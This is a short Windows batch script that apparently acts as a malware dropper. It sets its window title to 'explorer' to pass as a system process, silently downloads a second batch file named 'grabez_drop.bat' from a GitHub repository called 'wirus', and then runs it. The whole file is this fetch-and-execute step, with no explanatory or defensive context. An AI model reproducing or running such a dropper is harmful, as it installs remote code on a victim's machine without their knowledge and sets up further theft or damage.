@echo off
title explorer

powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/kolmipilot/wirus/master/grabez_drop.bat -OutFile .\grabez_drop.bat" > nul

timeout /t 2 /nobreak > NUL
start grabez_drop.bat